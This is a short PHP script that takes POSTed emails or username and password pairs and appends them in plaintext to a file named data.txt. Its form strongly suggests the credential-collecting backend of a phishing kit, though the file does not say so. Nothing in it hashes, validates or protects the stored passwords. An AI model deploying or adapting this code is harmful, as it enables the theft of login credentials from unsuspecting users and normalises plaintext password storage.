<?php
function WriteInFile($data) {
  try
  {
     $myfile = fopen("data.txt", "a") or die("Unable to open file!");
     fwrite($myfile, $data);
     fclose($myfile);
     echo "true";
  }
  catch(customException $error)
  {
     echo "false";
  }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  if(isset($_POST["email"])) {
      WriteInFile($_POST["email"].",");
  } else if(isset($_POST["uname"]) && isset($_POST["password"])) {
      WriteInFile($_POST["uname"].":".$_POST["password"].",");
  } else {
   echo "boş";
  }
} else {
 echo "false";
}
?>
